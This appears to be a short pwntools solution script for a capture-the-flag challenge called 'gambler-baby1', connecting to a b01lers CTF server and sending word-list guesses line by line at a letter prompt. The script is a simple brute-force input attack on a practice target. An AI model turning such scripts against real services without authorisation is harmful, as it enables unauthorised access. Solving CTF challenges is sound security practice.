from pwn import *
context(arch = "amd64", os = "linux", log_level = "Debug")
io = process("./gambler-baby1")
io = remote("ctf.b01lers.com", 9202)
with open('dict.txt','r') as f:
    for line in f:
        io.sendafter("lowercase letters:", line)
io.recvall()

